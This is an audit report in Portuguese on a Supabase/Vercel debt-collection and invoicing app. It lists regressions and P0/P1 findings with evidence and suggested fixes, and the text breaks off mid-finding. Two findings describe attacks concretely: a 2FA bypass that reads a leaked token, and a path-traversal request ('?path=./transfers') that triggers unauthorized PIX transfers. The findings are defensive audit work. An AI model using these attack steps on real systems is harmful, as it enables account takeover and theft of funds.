# AUDITORIA-2026-07 — cobrasq-faturamento

> Vistoria completa do repositório e do projeto Supabase `jokbxzhcctcwnbhkhgru`, executada em 2026-07-01/02.
> Método: recheck do catálogo fixo `docs/audit/REGRESSOES.md` (R-01..R-12 + invariantes F-04/F-20) +
> varredura em 18 fatias do sistema (`index.html`, `crm.html`, `calc-*`, `api/`, `supabase/functions`,
> migrações e contratos), cada achado passando por **verificação adversarial** independente antes de entrar
> nesta lista. Achados que não sobreviveram à verificação foram descartados.

## Sumário executivo

- **118 achados confirmados** após verificação adversarial (**1 P0 · 25 P1 · 50 P2 · 42 P3**).
- **10 achados refutados** e removidos na verificação (falsos-positivos / já mitigados).
- Recheck do catálogo: **3 regressões ainda ABERTAS** — R-06 (drift de esquema/trigger fora das migrations),
  R-08 (pagamentos não viram `fin_operacao`), R-10 (Z-API falso "enviada"). As demais R-NN estão mitigadas.
- **Prioridade máxima:** 1 falha P0 de segurança no portal do devedor (2FA contornável + vazamento de PII)
  — detalhada abaixo; correção exige alterar a RPC `portal_emitir_token` (migração preparada, não aplicada).

> ⚠️ Conforme `CLAUDE.md`, migrações e edge functions **não** são aplicadas cegamente. As correções de banco
> deste relatório vão como **arquivos de migração preparados** em `supabase/migrations/`, para revisão e deploy
> controlado. As correções de front/serverless entram no diff da branch.

## Situação das correções (atualizado 2026-07-02)

Os achados foram corrigidos em ondas por gravidade, na branch `claude/github-repo-audit-fixes-osxame` (PR #255).
Cada onda passou por `npm test` + `npm run lint` verdes e `node --check` do script inline.

| Onda | Gravidade | Corrigidos | Pulados (motivo) |
|------|-----------|-----------|------------------|
| 0 | críticos | 2 (P0 portal + multa única) | — |
| 1 | P1 | 19 | ~5 (backend/RPC/DDL) |
| 2 | P2 | 41 | ~6 (UI nova, DDL, infra, decisão) + 2 migrações preparadas |
| 3 | P3 | 25 | ~16 (código morto/latente, decisão, DDL) |
| **Total** | | **~87 em código** | **~27 dependem de decisão/backend** |

**Migrações preparadas (NÃO aplicadas — revisar e aplicar com deploy coordenado):**
- `20260704c_p0_portal_emitir_token_server_only.sql` — fecha o P0 (deploy junto com `api/mfa.js` + `index.html`).
- `20260705_valor_capital_lock_PREPARADA.sql` — trava server-side de `valor_capital`.
- `20260705_fin_transferencia_saldo_PREPARADA.sql` — espelho de transferências no saldo realizado.

**Edge functions:** o fonte foi corrigido (`zapsign-webhook`, `beatriz-msg`, `enviar-whatsapp`,
`cron-mensagens-agendadas`, `escavador-webhook`) mas o **deploy é manual/coordenado** — não foi feito.

**Principais pendências que dependem de você (decisão/backend):** persistência de acordos (rehidratar do banco);
portal do devedor abrir vazio + login CPF/nascimento (nova RPC `SECURITY DEFINER`); botão "Criar usuário" (Edge
Function nova); UI de reenvio de mensagens falhadas; trava anti-duplicidade da auto-cobrança ZapSign (índice único);
bucket `avatars` no Storage; paridade de juros/multa admin×CRM (fonte única); remover `?token=` dos webhooks
(rotacionar no painel do provedor primeiro).

## 1. Recheck do catálogo de regressões (R-01..R-12 + invariantes)

| Item | Estado |
|------|--------|
| R-01 · Divergência blob × relacional | ✅ mitigado |
| R-02 · F-20 falso-positivo bloqueia save do colaborador | ✅ mitigado |
| R-03 · Rascunho-fantasma (caso some e volta) | ✅ mitigado |
| R-04 · "O conserto ficou em PR aberto" (nunca foi pro ar) | ✅ mitigado |
| R-05 · Limite de 12 funções da Vercel (build quebra silencioso) | ✅ mitigado |
| R-06 · Trigger/esquema em prod fora das migrations (drift) | 🔴 ABERTO |
| R-07 · Tabelas de backup/arquivo expostas (vazamento de PII) | ✅ mitigado |
| R-08 · Pagamentos não viram fin_operacao (corrente parada) | 🔴 ABERTO |
| R-09 · Corrente acordo → boleto (num_parcelas nulo / reflexo no CRM) | ✅ mitigado |
| R-10 · Z-API: falso "enviada" (mensagem não chega) | 🔴 ABERTO |
| R-11 · Cobranças vazias (sem valor e sem credor) | ✅ mitigado |
| R-12 · Portal do cedente quebrado pelo blob staff-only | ✅ mitigado |
| Invariantes F-04 (view casos security_invoker) e F-20 (rebase _lastKnownDevCount + trava anti-encolhimento) + portão CI de migrations | ✅ mitigado |

### 🔴 R-06 · Trigger/esquema em prod fora das migrations (drift)

**Evidência:** Prod (jokbxzhcctcwnbhkhgru, §1 de supabase/verification/auditoria_deploy.sql) tem 7 triggers nas 5 tabelas auditadas; 5 têm migration versionada: devedores_set_cadastrado_por (supabase/migrations/2026-06-09a_devedores_cadastrado_por_e_rls_multi_tenant.sql:26), cobrancas_set_cadastrado_por (2026-06-15a_cobrancas_e_partes.sql:124), devedores_preserve_asaas (2026-06-25_devedores_preserve_asaas_customer_id.sql:28), trg_calendar_orphans_devedores (20260511_03_fase_C_regua_e_calendar.sql:71) e o novo trg_enforce_cliente_app_user_id (20260701_cedente_app_user_id_trigger.sql:39, aplicado em prod como versão 20260701054235). F-04 OK: view casos com reloptions security_invoker=true. DRIFT: (1) trg_cobrasq_data_anti_shrink existe em prod ("CREATE TRIGGER trg_cobrasq_data_anti_shrink BEFORE UPDATE ON public.cobrasq_data ... EXECUTE FUNCTION fn_cobrasq_data_anti_shrink()") e consta no schema_migrations de prod (20260612021448 f20_trigger_anti_encolhimento_cobrasq_data), mas NÃO há arquivo 20260612* em supabase/migrations/ e `git log --all` mostra que nunca existiu — o repo só tem o ALTER FUNCTION do search_path em 20260617_03_advisors_security_fixes.sql:36; (2) acordos_updated_at ("... EXECUTE FUNCTION set_updated_at()") não tem trigger, função set_updated_at() nem CREATE TABLE acordos em nenhuma migration do repo (herança do CRM anterior ao baseline 0000_MERGE_CRM_baseline.md; 2026-05-11e_acordos_zapsign.sql só faz ALTER). Ou seja, o "estado-correto" (todo objeto de prod com migration correspondente no repo) nunca foi plenamente atingido; a linha "Última checagem" do R-06 (docs/audit/REGRESSOES.md:64-66) estava otimista quanto ao anti-shrink. Nada regrediu desde então (nenhum arquivo foi removido; o trigger novo de 2026-07-01 foi corretamente versionado).

**Ação sugerida:** Fechar o drift documental sem tocar em prod: (1) capturar em prod pg_get_functiondef('fn_cobrasq_data_anti_shrink') e criar o arquivo supabase/migrations/20260612_f20_trigger_anti_encolhimento_cobrasq_data.sql com a função + CREATE TRIGGER, cabeçalho "JÁ APLICADO EM PROD (schema_migrations 20260612021448) — NÃO RE-EXECUTAR" no padrão do 0000_MERGE_CRM_baseline.md; (2) criar um baseline documental para os objetos pré-merge do CRM que faltam (CREATE TABLE acordos, função set_updated_at(), trigger acordos_updated_at), mesma marcação; (3) atualizar a linha "Última checagem" do R-06 em docs/audit/REGRESSOES.md registrando o gap encontrado e o novo trigger trg_enforce_cliente_app_user_id (versionado ✓). Nenhum comando de escrita no banco é necessário.

### 🔴 R-08 · Pagamentos não viram fin_operacao (corrente parada)

**Evidência:** Prod (SELECTs read-only, projeto jokbxzhcctcwnbhkhgru): §4 → dev_total=77, sem_asaas_customer=61 (79%), com_asaas_customer=16; fin_operacao tem 1 única linha na história (valor_recebido R$ 156,00, criada_em 2026-06-26) — corrente essencialmente parada; trigger devedores_preserve_asaas presente ✓. GitHub: PR #59 (gsteixeiradossantos-alt/cobrasq) foi FECHADO SEM MERGE em 2026-06-27 com o argumento de que o fluxo "já existe na main" — o catálogo ainda diz "PR #59 ABERTO", informação desatualizada. Código na main desmente a justificativa do fechamento: index.html:2474 botão "Registrar pagamento" (devDrawer-pagarBtn) → index.html:10031 `document.getElementById('devDrawer-pagarBtn').onclick = ()=>abrirHistorico(devId)` → modal genérico mhist-* (index.html:3567-3595) SEM campo de valor; salvarHistorico (index.html:13067-13088) grava só {tipo,data,desc,prox,autor}; recuperadoNoMes (index.html:7764-7776) soma apenas parcelas de acordo `p.pago` (pagamento avulso fica de fora). A conciliação WhatsApp (index.html:26216-26234) registra comprovante/andamento mas "NÃO altera o saldo" e não cria fin_operacao. Só o webhook Asaas gera fin_operacao (api/_processar-recebimento.js), cujo fallback por asaas_customer_id (linhas 59-62) não alcança os 61 devedores sem o id.

**Ação sugerida:** 1) Reimplementar sobre a main atual o fluxo "Registrar pagamento" com campo de valor (o conteúdo do #59: campo no modal, validação > 0, gravar {tipo:'Pagamento', valor} e alimentar recuperadoNoMes/fin_operacao) — o PR #59 foi fechado como "superado" mas a funcionalidade NÃO existe na main; reabrir a discussão com o Gustavo citando index.html:10031/13067. 2) Rodar o backfill api/_backfill-asaas-customers.js (61/77 devedores ativos sem asaas_customer_id) para o casamento de pagamentos no webhook funcionar. 3) Atualizar o catálogo REGRESSOES.md: no R-08 e no R-04, trocar "PR #59 ABERTO" por "PR #59 FECHADO SEM MERGE em 2026-06-27 (fix descartado; funcionalidade ausente na main)". 4) Decidir se a conciliação WhatsApp deve gerar fin_operacao (hoje é só registro auditável, sem efeito financeiro).

### 🔴 R-10 · Z-API: falso "enviada" (mensagem não chega)

**Evidência:** PR #91 foi MERGEADO em 2026-06-27T07:07:03Z (não é mais DRAFT como diz a "Última checagem" do catálogo) e o fix está no ar: supabase/functions/cron-mensagens-agendadas/index.ts:46-51 define envioConfirmado() (exige messageId/zaapId/id e ausência de error/errorDescription/value:false/success:false) e a linha 161 só marca status='enviada' com `result.ok && envioConfirmado(result.data)`; a edge function implantada em prod (projeto jokbxzhcctcwnbhkhgru, versão 28, ACTIVE, conferida via get_edge_function) contém esse código. PORÉM, nos dois arquivos que o R-10 lista em "Onde" a validação real NUNCA foi aplicada: api/_zapi.js:24 valida só HTTP (`if (!r.ok) throw new Error(...)`) e devolve o corpo sem checar messageId/error; api/cron-regua.js:98-117 tem cópia idêntica de zapiSendText e, nas linhas 588-592 (régua de cobrança) e 649-653 (régua de acordo), chama confirmarEnvio() que promove regua_envios.status='sent' apenas porque enviarPorCanal não lançou exceção — um HTTP 200 do Z-API sem messageId (instância desconectada) ainda vira "sent" na régua. Outros consumidores já validam (api/_repasse-concluido.js:91 e api/_emitir-nf.js:120 checam zap.messageId; crm.html:2914 e index.html:29157 idem), o que deixa a régua do cron-regua.js como o único caminho de envio ainda sujeito ao falso "enviada".

**Ação sugerida:** 1) Portar a validação do PR #91 para o runtime Vercel: em api/_zapi.js, após o parse do corpo, rejeitar (throw) quando não houver messageId/zaapId/id ou quando houver error/errorDescription/value:false/success:false — assim api/cron-regua.js (que chama zapiSendText antes de confirmarEnvio→'sent') e todos os demais consumidores herdam a checagem; fazer o mesmo na cópia local de zapiSendText dentro de api/cron-regua.js (linhas 98-117) ou unificar as duas implementações importando de _zapi.js. 2) Atualizar a linha "Última checagem" do R-10 em docs/audit/REGRESSOES.md: #91 MERGED (2026-06-27) e edge cron-mensagens-agendadas v28 implantada; pendência restante restrita a api/_zapi.js + api/cron-regua.js.

## 2. Achados P0 — crítico (1)

### P0-01 · Portal do devedor: RPC portal_emitir_token devolve o token e o telefone completo ao cliente anônimo — 2FA contornável e vazamento de PII

- **Local:** `index.html:6015` · fatia `idx-login-sessao` · tipo `code`
- **Cenário de falha:** Atacante abre a aba 'Devedor', digita o CPF de uma vítima e clica 'Enviar código'. A resposta da RPC portal_emitir_token traz {token:'123456', telefone:'46999990000'}. Ele lê o token no Network, chama portal_validar_token com esse token e entra no portal como a vítima, vendo débitos e dados pessoais — sem nunca ter acesso ao WhatsApp dela.
- **Correção sugerida:** Não retornar 'token' nem o telefone completo ao cliente. Fazer o envio da mensagem Z-API no servidor (como api/mfa.js já faz), ou fazer a RPC apenas registrar o token e disparar o envio server-side; ao cliente devolver só telefone_mask e ok:true.

## 3. Achados P1 — alto (25)

### P1-01 · Dedup por CPF+valor não bloqueia nota 'processando': reemissão cria 2ª NFS-e real na prefeitura e a 1ª vira órfã

- **Local:** `api/_emitir-nf-avulso.js:89` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Proprietário cola planilha com a linha 'João; 123.456.789-00; 2.429,53' repetida (ou clica Emitir lote de novo antes da 1ª autorizar). 1ª chamada cria invoice A (processando). 2ª chamada: `mesmas` acha a linha 'processando', não bloqueia, reusa a row e cria invoice B — nf_asaas_id vira B. A prefeitura autoriza A e B: duas NFS-e reais para o mesmo serviço (ISS em dobro), e A não aparece em lugar nenhum no app para cancelar.
- **Correção sugerida:** No backend, antes de criar nova invoice, se a linha de reuso tem nf_asaas_id, consultar GET /invoices/{id} e: se SCHEDULED/AUTHORIZED, retornar skip/status em vez de emitir outra; usar `ref` como chave de idempotência. No front, incluir as linhas irmãs do lote no `nfaDupOf`.

### P1-02 · Repasse PIX que FALHA no Asaas fica preso e nunca é reenviado ao credor

- **Local:** `api/_repasse-concluido.js:57` · fatia `api-dinheiro` · tipo `code`
- **Cenário de falha:** Credor com PIX inválido/agência fechada: /api/repassar dispara o transfer, Asaas responde não-DONE (fica 'preparado' com transfer_id), depois manda TRANSFER_FAILED via webhook → _repasse-concluido põe status='pendente' mas guarda transfer_id. Operador vê 'pendente' no painel e clica 'Repassar' de novo → resposta 'repasse já disparado (sem reenvio)', repasse_status permanece 'pendente'. O credor nunca recebe e não há botão/rota que resolva.
- **Correção sugerida:** No ramo `falhou` de _repasse-concluido.js, setar repasse_asaas_transfer_id=null (guardando o id antigo em metadata.repasse_asaas_transfer_id_falho) para liberar novo disparo; OU em _repassar.js:54, quando o transfer existente estiver em estado terminal de falha (FAILED/CANCELLED/ERROR), permitir re-disparo em vez de retornar 'sem reenvio'.

### P1-03 · Denylist de endpoints que movem dinheiro no proxy Asaas é contornável por path traversal (../ e ./)

- **Local:** `api/asaas.js:43` · fatia `api-integracoes` · tipo `code`
- **Cenário de falha:** Qualquer usuário logado no Supabase (inclusive um cedente com papel restrito) faz `POST /api/asaas?path=./transfers` com body de transferência PIX. O denylist não casa (resource='./transfers'), a chave ASAAS_API_KEY do escritório é injetada pelo servidor e o Asaas executa a transferência para a chave PIX do atacante — bypassando a restrição server-only do repasse. O mesmo vale para `./myAccount`, `./accounts`, `./anticipations`, etc.
- **Correção sugerida:** Aplicar em api/asaas.js a MESMA guarda de api/zapi.js/zapsign.js: rejeitar `pathParam` que contenha '..' ou './' e validar com whitelist de caracteres (`/^[A-Za-z0-9/_.-]+$/` não basta pois '.' é permitido; barrar segmentos '.'/'..'). Idealmente trocar o denylist por uma ALLOWLIST de recursos permitidos (payments, customers, installments, invoices, pix/qrCodes de leitura) — foi exatamente o P2 de junho que ficou por fazer.

### P1-04 · Proposta de cartão via WhatsApp informa total errado (usa total à vista, não o total do cartão)

- **Local:** `crm.html:5699` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Dívida com totalAvista R$ 10.000: mensagem enviada = “12x de R$ 1.374 sem juros (total R$ 10.000,00)”, mas 12×1.374 = R$ 16.488. Devedor aceita por escrito um total 65% menor do que o efetivamente cobrado — risco jurídico/consumerista e de quebra do acordo.
- **Correção sugerida:** Usar `calc.cartao12Total` como total na mensagem do ramo 'cartao' (e remover/ajustar o “sem juros”), igual ao card da tela: `(total ' + fmtBRL(calc.cartao12Total || cartao12*12) + ')`.

### P1-05 · Worker frontend de mensagens agendadas envia sem claim — duplica mensagens em corrida com o cron e com outras abas

- **Local:** `crm.html:7170` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Auto-cobrança agenda mensagem para agora+60s (linha 7263). Aba do CRM roda o worker (5s após load ou a cada 5 min) e envia; no mesmo minuto o cron pg_cron claima a linha ainda 'pendente' e envia de novo → devedor recebe a mesma cobrança 2x pelo WhatsApp (exposição a reclamação de cobrança abusiva).
- **Correção sugerida:** No frontend, claimar antes de enviar: `update({status:'processando'}).eq('id', m.id).eq('status','pendente').select()` e só enviar se retornou linha; ou simplesmente remover o worker frontend, já que o cron de 1 min cobre o caso com lock correto.

### P1-06 · Worker frontend de mensagens agendadas envia sem lock — duplica envios com o cron e entre abas

- **Local:** `crm.html:7174` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Mensagem agendada vence às 09:00; operadora abre o CRM às 09:00:03. O worker do CRM seleciona a linha e começa a enviar; no tick de 09:01 o cron ainda vê status='pendente' (o CRM só atualiza depois do envio), trava e envia de novo. O devedor recebe a mesma cobrança duas vezes. Mesmo cenário entre duas abas/operadores do CRM.
- **Correção sugerida:** Remover o worker frontend (o cron de 1 min já cobre o caso) ou, no mínimo, replicar o lock otimista: UPDATE status='processando' WHERE id=... AND status='pendente' e só enviar se a linha foi afetada.

### P1-07 · Worker frontend ignora o campo `tipo` — agendamentos de áudio/documento/imagem são destruídos como texto

- **Local:** `crm.html:7184` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Operador agenda um áudio pela aba WhatsApp do index.html para 09:00. Outro operador abre o CRM às 09:00 antes do tick do cron: o worker do CRM tenta enviar como texto vazio, recebe 400, grava status='falhou' com tentativas=1. O áudio nunca é entregue e o cron (que saberia enviá-lo) não o vê mais.
- **Correção sugerida:** No worker frontend, filtrar `.eq('tipo','texto')` (ou pular linhas com tipo != 'texto'/media_path preenchido) — ou remover o worker e deixar tudo com o cron.

### P1-08 · Admin > Criar usuário chama Edge Function 'criar-usuario' que não existe (nem no repo, nem em produção)

- **Local:** `crm.html:8787` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Admin abre Usuários → '+ Novo usuário', preenche nome/e-mail/senha e clica 'Criar usuário'. A chamada falha sempre (função inexistente, 404), toast genérico, nenhum usuário é criado — funcionalidade morta em produção.
- **Correção sugerida:** Criar/implantar a Edge Function 'criar-usuario' (admin API do Supabase com service role + verificação de role admin) e versioná-la em supabase/functions/, ou remover o botão e documentar o fluxo alternativo de criação de usuários.

### P1-09 · Botao 'Criar usuario' chama Edge Function inexistente (criar-usuario)

- **Local:** `crm.html:8787` · fatia `contratos-front-back` · tipo `code`
- **Cenário de falha:** Gestor abre Admin > Novo usuario, preenche nome/email/senha/role e clica 'Criar usuario': a invocacao de 'criar-usuario' retorna erro de funcao inexistente, o toast de erro aparece e nenhum usuario e criado. O onboarding de usuarios pela UI esta 100% quebrado.
- **Correção sugerida:** Criar e implantar a Edge Function 'criar-usuario' (que usa a service_role para auth.admin.createUser + insert em profiles) OU alterar o front para o mecanismo real de criacao de usuario ja existente. Confirmar com list_edge_functions apos o deploy.

### P1-10 · Entrega do token do devedor depende do Z-API guardado no blob staff-only (DB.config): código gerado mas nunca enviado

- **Local:** `index.html:6022` · fatia `idx-portais` · tipo `code`
- **Cenário de falha:** Devedor digita CPF válido → portal_emitir_token grava token e retorna telefone → o front tenta enviar via Z-API mas DB.config.zapiInstanceId é undefined (blob staff-only) → mensagem 'Z-API não configurado' e nenhum WhatsApp sai. O devedor nunca recebe o código.
- **Correção sugerida:** Mover o envio do WhatsApp para o servidor (Edge Function/RPC que já dispara enviar-whatsapp com as credenciais do lado do servidor), como feito em cedente_nova_consulta, em vez de depender de DB.config no cliente anon.

### P1-11 · Tabela CALC_INPC_MENSAL drifta da matriz CalcEngine: 9 meses com valor errado + 2026-05 ausente (valores de execução errados)

- **Local:** `index.html:9086` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Parcela de R$ 10.000 vencida em 31/10/2023: o modal 'Confirmar e gerar peça' mostra atualizado com 2023-11=0,33% e sem a correção de mai/2026, enquanto a Calculadora Jurídica (matriz) usa 0,10% e inclui mai/2026 — dois valores diferentes para a mesma execução, e o número errado é gravado em dev.execucoes e notificado ao cedente.
- **Correção sugerida:** Substituir calcDividaAtualizada/CALC_INPC_MENSAL por CalcEngine.correcaoMensal/juridica (índice INPC) e apagar a tabela duplicada, como o próprio PR #183 (R-11) lista como pendência mais urgente.

### P1-12 · CALC_INPC_MENSAL (execução) tem 9 valores divergentes da matriz/IBGE — inclusive sinal invertido — e não tem 2026-05

- **Local:** `index.html:9086` · fatia `calc` · tipo `code`
- **Cenário de falha:** Execução de dívida vencida em 01/2022: _execAgg → calcDividaAtualizada aplica 0,73% em jan/2022 (real 0,67%), +0,09% em jul/2023 (real −0,09%), 0,33% em nov/2023 (real 0,10%) etc. — o valor da causa na petição sai maior que o devido (risco de impugnação/excesso de execução); em jun/2026, maio/2026 não é corrigido (valor a menor).
- **Correção sugerida:** Fechar a pendência do PR #183: trocar CALC_INPC_MENSAL por CalcEngine.TABELAS.INPC (ou, no mínimo, corrigir os 9 valores e acrescentar 2026-05 até a migração). O algoritmo de calcDividaAtualizada já é o mesmo pró-rata-die/garantia STJ de calcularPrincipal — só a fonte de dados diverge.

### P1-13 · Acordos registrados (Novo acordo) e baixas de parcela não persistem — 'Recuperado no mês' zera ao recarregar

- **Local:** `index.html:13134` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Operador registra acordo de R$ 10.000 em 5 parcelas pelo drawer (Novo acordo) e dá baixa em 2 parcelas pagas; painel mostra 'Recuperado no mês' = R$ 4.000. Ao dar F5 ou relogar, o acordo some do drawer, o KPI volta a R$ 0 e o devedor volta ao status anterior — sem nenhum aviso.
- **Correção sugerida:** Fazer salvarAcordo/toggleParcela gravarem na tabela relacional `acordos` (chamar upsertAcordoRelational, que já existe e nunca é chamado) e o load rehidratar d.acordos a partir dela; ou promover acordos a coluna/estrutura persistida. Alinhar com R-08/PR #59.

### P1-14 · Editar cobrança sobrescreve `vencimento` com `data_entrada` (e grava o vencimento como data de entrada)

- **Local:** `index.html:15368` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Cobrança importada do Astrea com entrada 2026-03-01 e vencimento 2026-08-15. O gestor abre 'Editar cobrança' só para trocar o responsável e salva: o campo Vencimento veio pré-preenchido com 2026-03-01 e o save grava vencimento=2026-03-01 — o caso passa a constar ~150 dias 'em aberto/vencido' e entra errado em régua e relatórios.
- **Correção sugerida:** Separar os campos: pré-preencher Vencimento com cob.vencimento || divida.vencimento; adicionar campo próprio de 'Entrada na carteira' (default hoje() na criação) e parar de gravar data_entrada=venc. Depois, corrigir por dado as 37 linhas onde data_entrada==vencimento se recuperável.

### P1-15 · salvarCobranca() grava coluna inexistente devedores.status → INSERT/UPSERT falha e aborta o salvamento da cobrança

- **Local:** `index.html:15672` · fatia `contratos-db` · tipo `code`
- **Cenário de falha:** Usuário abre o formulário de cobrança, adiciona um responsável/devedor que ainda não existe na base e clica em Salvar. escolherDevedorExistente() retorna null → cai no else de L15670 → insert em devedores com status:'Cobrar' → PostgREST retorna 400 (coluna status inexistente) → throw 'contato <nome>: ...' → salvamento inteiro falha; nenhuma cobrança/parte é criada. Mesmo efeito no upsert de hotfix FK (L15734). Só funciona quando todos os devedores já existiam previamente.
- **Correção sugerida:** Remover a chave status:'Cobrar' dos dois objetos (L15672 e L15734), alinhando com o insert do import Astrea (L6768). O status já é definido em cobrancas (novaCobr.status/updCob.status).

### P1-16 · Portal do devedor quebrado (análogo ao R-12): renderPortalDevedor exige DB.devedores, que é vazio para o devedor autenticado por token/nascimento

- **Local:** `index.html:18618` · fatia `idx-portais` · tipo `code`
- **Cenário de falha:** Devedor recebe o código no WhatsApp, digita CPF+token no celular (sem sessão de staff, localStorage limpo). portal_validar_token retorna ok+devedor_id, iniciarSessao() abre portalDevedor, mas DB.devedores=[] → renderPortalDevedor mostra 'Dados não encontrados' em vez do débito. Idem no fallback por data de nascimento, que sequer consegue logar ('Dados não encontrados. Verifique CPF e data de nascimento').
- **Correção sugerida:** Criar uma RPC SECURITY DEFINER (ex.: portal_meu_caso(cpf, token) ou reaproveitar o devedor_id validado) que devolva os campos que renderPortalDevedor precisa (valor, status, acordos), e fazer o fluxo de login do devedor consumir esses dados em vez de DB.devedores; ou autenticar o devedor com sessão Supabase (papel='devedor', já existe a policy devedores_self em prod).

### P1-17 · Editar lançamento zera valor_pago, juros, multa e desconto silenciosamente

- **Local:** `index.html:24966` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Gestor baixa parcialmente uma despesa de R$ 1.000 pagando R$ 100 (valor_pago=-100, status=2). Depois edita só a descrição e salva: valor_pago vira null → saldo realizado da conta cai R$ 1.000 em vez de R$ 100, e juros/multa registrados no lançamento são apagados.
- **Correção sugerida:** Em editarLancamento, popular mlanc-juros/multa/desconto com os valores do lançamento; em saveLancamento, não incluir valor_pago (e juros/multa/desconto) no payload quando não vierem do formulário (undefined ≠ null).

### P1-18 · Arquivar/Conciliar/Criar tarefa não remove a conversa da fila de verdade — ela volta a Pendentes no próximo reload (e a Bia pode responder número arquivado como Spam)

- **Local:** `index.html:25563` · fatia `idx-whatsapp-bia` · tipo `migration`
- **Cenário de falha:** Operador arquiva conversa como 'Spam / engano' → troca de aba e volta em Pendentes: a conversa reaparece na fila (e duplicada em Resolvidas). Se o gestor ligar a Bia, o worker responde automaticamente esse número de spam, pois estado='resolvido' não é pulado e humano_ate não foi setado.
- **Correção sugerida:** Redefinir vw_conversas_pendentes (mantendo WITH (security_invoker=true), guarda F-04) para excluir telefones com whatsapp_atendimentos.estado='resolvido' AND resolvido_em/updated_at > r.recebida_em; alternativa mínima no front: em renderWAPendentes, subtrair de P.lista os telefones presentes em P.arquivadas com resolvido_em posterior à recebida.

### P1-19 · Bloqueio de régua (Spam/engano) é irreversível: Desfazer/Restaurar não limpam regua_bloqueada nem dev.metadata.reguaBloqueada, e não existe UI de desbloqueio

- **Local:** `index.html:25989` · fatia `idx-whatsapp-bia` · tipo `code`
- **Cenário de falha:** Operador arquiva por engano como 'Spam / engano' e clica 'Desfazer' no toast: a conversa volta à fila, mas regua_bloqueada continua true e dev.metadata.reguaBloqueada também. Todas as cobranças agendadas futuras desse devedor são canceladas pelo worker sem aviso, e a régua manual recusa disparar, sem nenhum botão para reverter.
- **Correção sugerida:** Em waPendReabrir/waPendRestaurar, upsert com regua_bloqueada:false e limpar dev.metadata.reguaBloqueada quando o motivo original era Spam/engano; adicionar chip/ação 'Desbloquear régua' na visão Resolvidas (onde o chip 'Régua bloqueada' já é exibido, 25764).

### P1-20 · Emitir cobranças do acordo (mv2) usa o valor TOTAL da dívida, ignorando o valor negociado do acordo

- **Local:** `index.html:28981` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Dívida de R$ 12.000; acordo fechado em R$ 5.000 em 10 parcelas. O operador gera a Proposta de Acordo com valor_acordo = R$ 5.000 e clica 'Emitir cobranças': o sistema cria 10 PIX de R$ 1.200 (total R$ 12.000) no Asaas em nome do devedor — mais que o dobro do combinado.
- **Correção sugerida:** Usar parseValorBR(campos.valor_acordo || campos.valor_total) como base (com fallback explícito e confirmação mostrando a origem do valor); distribuir centavos na última parcela; registrar a emissão (metadata/acordos) para bloquear reemissão em duplicidade.

### P1-21 · Corrigir o CPF de uma linha não limpa asaasCustomerId obsoleto — NFS-e é emitida para o tomador ERRADO

- **Local:** `index.html:29257` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Usuário roda 'Buscar CPF no Asaas'; a busca por nome acha um homônimo e preenche CPF+asaasCustomerId errados. Usuário percebe, digita o CPF certo por cima (situação exibe 'pronta') e emite. A nota sai contra o customer do homônimo no Asaas/prefeitura; nf_avulsa grava doc=CPF certo + asaas_customer_id do homônimo.
- **Correção sugerida:** Em `nfaOnDoc`, quando o doc digitado divergir do doc do customer vinculado, zerar `r.asaasCustomerId` (e `lookupMsg`). Alternativa no backend: se body.doc e o cpfCnpj do customer indicado divergirem, ignorar o asaas_customer_id e resolver por CPF.

### P1-22 · "Selecionar todos" seleciona registros ocultos (rascunhos, pendentes de aprovação e carteira de outros usuários)

- **Local:** `index.html:31518` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Funcionário abre Devedores (vê só os 30 casos dele), clica em 'Selecionar todos (30)' e depois 'Alterar status' ou 'Excluir': selectedDevIds recebe TODOS os registros do blob (inclusive de outros operadores, rascunhos e submissões de cedente aguardando aprovação) e a ação em lote sobrescreve status/etiqueta ou arquiva registros que ele nunca viu — inclusive pendências de aprovação que somem da fila do gestor.
- **Correção sugerida:** Fazer selecionarTodosFiltrados reutilizar exatamente o mesmo predicado de renderDevedores (extrair a função de filtro para um helper único, incluindo isDraft, status pendentes, devEhDoUsuario e applyGrupoViewFilterDevedores), e/ou fazer _bulkGetDevs interseccionar com a lista visível atual.

### P1-23 · bulkExcluir sem checagem de papel: colaborador arquiva em massa sem a aprovação exigida no fluxo individual

- **Local:** `index.html:31593` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Colaborador entra em modo seleção, marca N devedores (ou usa 'Selecionar todos', que ainda sobre-seleciona — ver achado anterior), clica em 'Excluir', digita 'excluir' e arquiva a carteira inteira sem passar pelo fluxo de aprovação que a UI promete para exclusões de colaborador.
- **Correção sugerida:** Em bulkExcluir, replicar a regra de excluirDevedorIndividual: se ehColaborador(), transformar em solicitação de aprovação (solicitarAprovacao) ou bloquear com toast; opcionalmente esconder/desabilitar bulk-btn-excluir para colaborador.

### P1-24 · mapEvento trata 'doc_partially_signed' como 'assinado' → emite boletos e conclui o caso antes de todos assinarem

- **Local:** `supabase/functions/zapsign-webhook/index.ts:45` · fatia `edge-webhooks` · tipo `code`
- **Cenário de falha:** Acordo com 2 signatários (ex.: devedor + credor/testemunha). Devedor assina primeiro → ZapSign envia event_type='doc_partially_signed' → mapEvento retorna 'assinado' → webhook chama /api/emitir-acordo e emite os boletos (dinheiro) e marca acordo_final.assinado/data_assinatura, mesmo com o documento ainda não totalmente assinado.
- **Correção sugerida:** Tratar 'partially_signed'/'partial' ANTES do ramo genérico de 'signed', mapeando para um status próprio (ex.: 'assinado_parcial') que NÃO dispara emissão de boletos nem conclusão do caso. Ex.: `if (e.includes('partial')) return 'assinado_parcial';` no início de mapEvento.

### P1-25 · Multa é reaplicada depois de um pagamento que a quita — viola a regra 'multa única' do próprio motor

- **Local:** `templates/calc-engine.js:145` · fatia `calc` · tipo `code`
- **Cenário de falha:** Memorial peticionável com multa 2% e um pagamento parcial que cobre juros+multa: a planilha mês a mês cobra a multa duas (ou mais) vezes — valor final da petição errado para mais, indefensável em juízo.
